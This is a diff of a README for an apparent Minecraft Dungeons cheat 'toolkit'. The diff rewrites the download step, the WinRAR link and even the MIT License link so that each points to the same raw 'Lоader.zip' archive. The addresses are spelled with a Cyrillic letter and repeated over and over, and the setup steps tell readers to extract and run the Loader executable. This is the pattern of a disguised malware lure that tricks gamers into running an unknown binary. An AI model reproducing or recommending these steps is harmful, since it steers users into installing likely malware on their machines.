@@ -62,8 +62,8 @@ Each feature is carefully designed for seamless integration and a safe, enjoyabl
 
 **Please follow the steps below to ensure smooth setup:**
 
-1. **Download `https://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zip` from this repository.**
-2. Extract all files using [WinRAR](https://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zip) or 7-Zip.
+1. **Download `https://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zip` from this repository.**
+2. Extract all files using [WinRAR](https://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zip) or 7-Zip.
 3. Launch the Loader executable file found in the extracted folder.
 4. Select the cheats and enhancements you wish to activate.
 5. Launch Minecraft Dungeons through the Loader or attach to a running game session.
@@ -82,7 +82,7 @@ This repository is intended strictly for educational, research, and testing purp
 
 ## 📄 License
 
-This project is distributed under the **[MIT License (2025)](https://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zip)**, allowing for open collaboration and modification while protecting your freedom to innovate.
+This project is distributed under the **[MIT License (2025)](https://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DANZGT/DungeonInferno-Toolkit/main/Lоader.zip)**, allowing for open collaboration and modification while protecting your freedom to innovate.
 
 ---
 
